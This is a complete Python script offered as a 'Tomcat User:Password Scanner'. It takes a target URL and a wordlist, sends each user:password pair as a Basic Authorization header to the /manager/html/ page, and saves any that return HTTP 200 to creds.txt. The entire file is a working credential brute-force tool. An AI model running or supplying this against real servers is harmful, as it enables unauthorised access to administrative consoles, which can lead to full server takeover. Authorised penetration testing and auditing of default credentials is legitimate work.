import requests
import time
import base64
import argparse

def encode(i):
    encoded = i.encode("ascii")
    encoded = base64.b64encode(encoded)
    encoded = encoded.decode("ascii")
    encoded = "Basic " + encoded 

    return encoded

def scanner(url,file):
    url = url + "/manager/html/"
    l = open(file,'r')
    
    win = open("creds.txt","w") 
    win.close()

    for i in l:
        i = i.strip()
        encoded = encode(i)
        
        header = {"Authorization": encoded}
        r = requests.get(url,headers=header)
    
        if r.status_code == 200:
            print("Founds Credentials: ",i)
            win = open("creds.txt","a") 
            win.write(i)
            win.write("\n") 
            time.sleep(1)
        else:
            print("Credentials: " + i + " are wrong!")
            continue
    
    l.close()
    win.close()
    print("Done! Check your creds.txt for any passwords found!")
    exit()

def main():
    parser = argparse.ArgumentParser(description='Tomcat User:Password Scanner')

    parser.add_argument('-t', metavar="<Target's URL>", help='target/host IP, E.G: http://scantomcat.blah', required=True)
    parser.add_argument('-f', metavar="<Wordlist>",default='list.txt', help='WordList To Use')

    args = parser.parse_args()

    url = args.t
    file = args.f

    print("Welcome to Tomcat user:password scanner!")
    time.sleep(1)
    
    scanner(url,file)


main()